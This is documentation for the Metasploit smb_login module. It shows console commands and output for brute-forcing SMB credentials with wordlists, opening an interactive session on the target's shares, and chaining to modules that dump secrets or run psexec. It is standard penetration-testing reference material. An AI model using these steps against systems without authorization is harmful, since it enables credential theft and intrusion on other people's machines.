The smb_login module is used to bruteforce SMB remotely. SMB credentials are extra valuable because they are system credentials, and you can probably reuse some of them to log in to more machines.

## Vulnerable Application

To use smb_login, make sure you are able to connect to a SMB service that supports SMBv1.

## Verification Steps

The following demonstrates a basic scenario of using the [built-in wordlists](https://github.com/rapid7/metasploit-framework/tree/master/data/wordlists) to brute-force SMB:

```msf
msf > use auxiliary/scanner/smb/smb_login 
msf auxiliary(smb_login) > set RHOSTS 192.168.1.80
RHOSTS => 192.168.1.80
msf auxiliary(smb_login) > set USER_FILE /Users/wchen/rapid7/msf/data/wordlists/unix_users.txt
USER_FILE => /Users/wchen/rapid7/msf/data/wordlists/unix_users.txt
msf auxiliary(smb_login) > set PASS_FILE /Users/wchen/rapid7/msf/data/wordlists/unix_passwords.txt
PASS_FILE => /Users/wchen/rapid7/msf/data/wordlists/unix_passwords.txt
msf auxiliary(smb_login) > run

[+] 192.168.1.80:445      - 192.168.1.80:445 SMB - Success: '.\root:monkey' Administrator
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(smb_login) >
```

If you have a database connected, you should also see this credential logged:

```msf
msf auxiliary(smb_login) > creds
Credentials
===========

host          origin        service        public  private  realm  private_type
----          ------        -------        ------  -------  -----  ------------
192.168.1.80  192.168.1.80  445/tcp (smb)  root    monkey          Password

msf auxiliary(smb_login) >
```

## Obtaining a Session

When using the smb_login module, the CreateSession option can be used to obtain an interactive
session within the smb instance. Running with the following options:

```msf
msf6 auxiliary(scanner/smb/smb_login) > run CreateSession=true RHOSTS=172.14.2.164 RPORT=445 SMBDomain=windomain.local SMBPass=password SMBUser=username
```

Should give you output containing:

```msf
[*] 172.14.2.164:445    - 172.14.2.164:445 - Starting SMB login bruteforce
[+] 172.14.2.164:445    - 172.14.2.164:445 - Success: 'windomain.local\username:password' Administrator
[*] SMB session 1 opened (172.16.158.1:62793 -> 172.14.2.164:445) at 2024-03-12 17:03:09 +0000
[*] 172.14.2.164:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_login) > sessions -i -1
[*] Starting interaction with 1...
```

Which you can interact with using `sessions -i <session id>` or `sessions -i -1` to interact with the most recently opened session.

```msf
msf6 auxiliary(scanner/smb/smb_login) > sessions -i -1
[*] Starting interaction with 1...

SMB (172.14.2.164) > shares
Shares
======

    #  Name    Type          comment
    -  ----    ----          -------
    0  ADMIN$  DISK|SPECIAL  Remote Admin
    1  C$      DISK|SPECIAL  Default share
    2  foo     DISK
    3  IPC$    IPC|SPECIAL   Remote IPC

SMB (172.14.2.164) > shares -i foo
[+] Successfully connected to foo
SMB (172.14.2.164\foo) > ls
ls
===
[truncated]
```

When interacting with a session, the help command can be useful:

```msf
SMB (172.14.2.164\foo) > help

Core Commands
=============

    Command       Description
    -------       -----------
    ?             Help menu
    background    Backgrounds the current session
    bg            Alias for background
    exit          Terminate the SMB session
    help          Help menu
    irb           Open an interactive Ruby shell on the current session
    pry           Open the Pry debugger on the current session
    sessions      Quickly switch to another session


Shares Commands
===============

    Command       Description
    -------       -----------
    cat           Read the file at the given path
    cd            Change the current remote working directory
    delete        Delete a file
    dir           List all files in the current directory (alias for ls)
    download      Download a file
    ls            List all files in the current directory
    mkdir         Make a new directory
    pwd           Print the current remote working directory
    rmdir         Delete a directory
    shares        View the available shares and interact with one
    upload        Upload a file


Local File System Commands
==========================

    Command       Description
    -------       -----------
    getlwd        Print local working directory (alias for lpwd)
    lcat          Read the contents of a local file to the screen
    lcd           Change local working directory
    ldir          List local files (alias for lls)
    lls           List local files
    lmkdir        Create new directory on local machine
    lpwd          Print local working directory

This session also works with the following modules:

  auxiliary/admin/dcerpc/icpr_cert
  auxiliary/admin/dcerpc/samr_account
  auxiliary/admin/smb/delete_file
  auxiliary/admin/smb/download_file
  auxiliary/admin/smb/psexec_ntdsgrab
  auxiliary/admin/smb/upload_file
  auxiliary/gather/windows_secrets_dump
  auxiliary/scanner/smb/pipe_auditor
  auxiliary/scanner/smb/pipe_dcerpc_auditor
  auxiliary/scanner/smb/smb_enum_gpp
  auxiliary/scanner/smb/smb_enumshares
  auxiliary/scanner/smb/smb_enumusers
  auxiliary/scanner/smb/smb_enumusers_domain
  auxiliary/scanner/smb/smb_lookupsid
  exploit/windows/smb/psexec
```

## Credential Options

By default, the smb_login module only requires the RHOSTS option to run. But in reality, you will
also need to supply user names and passwords. The following options are available to support
different credential formats:

**The USER_FILE option**

If you happen to manage all the found user names in a separate file, then this option would be
suitable for that. One per line.

An example of setting USER_FILE:

```
set USER_FILE [path to file]
```

**The PASS_FILE option**

If you happen to manage all the found passwords in a separate file, then this option would be
suitable for that. One per line.

```
set PASS_FILE [path to file]
```

**The USERPASS_FILE option**

If each user should be using a specific password in your file, then you can use this option. One
username/password per line:

```
set USERPASS_FILE [path to file]
```

**The DB_ALL_CREDS option**

This option allows you to reuse all the user names and passwords collected by the database:

```
set DB_ALL_CREDS true
```

**The DB_ALL_PASS option**

This option allows you to reuse all the passwords collected by the database.

```
set DB_ALL_PASS true
```

**The DB_ALL_USERS option**

This option allows you to reuse all the user names collected by the database.

```
set DB_ALL_USERS true
```

**The SMBUser option**

If you are testing a specific user, use this option.

```
set SMBUser [user name]
```

**The SMBPass option**

If you are testing a specific password, use this option.

```
set SMBPass [password]
```

Note: If an account has been successfully brute-forced, that account will not be tried again.

Additionally, if you wish to disable automatic detection of all-access systems, you can change the following option:

**The DETECT_ANY_AUTH option**

This option enables detection of systems accepting any authentication. A bogus login will be attempted.

```
set DETECT_ANY_AUTH false
```
